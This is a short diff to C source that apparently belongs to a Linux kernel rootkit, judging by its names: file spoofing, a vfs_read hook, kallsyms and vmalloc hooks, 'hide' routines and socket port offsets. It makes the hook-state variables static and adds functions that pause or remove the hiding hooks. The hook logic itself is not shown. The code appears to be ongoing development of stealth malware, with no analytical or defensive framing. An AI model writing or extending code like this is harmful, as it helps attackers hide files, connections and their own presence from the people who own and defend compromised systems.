@@ -5,11 +5,10 @@
 #define _NEVERC_KRT_SKC_DPORT_OFF NEVERC_KRT_SKC_DPORT_OFF
 #define _NEVERC_KRT_SKC_NUM_OFF   NEVERC_KRT_SKC_NUM_OFF
 
-/* Cross-file hook state, accessed by neverc_krt_cleanup_all() in nvk.c */
-struct neverc_krt_hook _neverc_krt_ks_hook;
-int _neverc_krt_ks_hooked;
-struct neverc_krt_hook _neverc_krt_vmalloc_hook;
-int _neverc_krt_vmalloc_hooked;
+static struct neverc_krt_hook _neverc_krt_ks_hook;
+static int _neverc_krt_ks_hooked;
+static struct neverc_krt_hook _neverc_krt_vmalloc_hook;
+static int _neverc_krt_vmalloc_hooked;
 
 /* ---- internal inline helpers ---- */
 
@@ -1412,5 +1411,25 @@ void neverc_krt_file_spoof_cleanup(void)
 	neverc_krt_hook_remove(&_neverc_krt_vfs_read_hook);
 	_neverc_krt_vfs_read_hooked = 0;
 	_neverc_krt_file_spoof_cnt = 0;
+}
+
+void neverc_krt_hide_pause_hooks(void)
+{
+	if (_neverc_krt_vmalloc_hooked)
+		neverc_krt_hook_pause(&_neverc_krt_vmalloc_hook);
+	if (_neverc_krt_ks_hooked)
+		neverc_krt_hook_pause(&_neverc_krt_ks_hook);
+}
+
+void neverc_krt_hide_remove_hooks(void)
+{
+	if (_neverc_krt_ks_hooked) {
+		neverc_krt_hook_remove(&_neverc_krt_ks_hook);
+		_neverc_krt_ks_hooked = 0;
+	}
+	if (_neverc_krt_vmalloc_hooked) {
+		neverc_krt_hook_remove(&_neverc_krt_vmalloc_hook);
+		_neverc_krt_vmalloc_hooked = 0;
+	}
 }
 
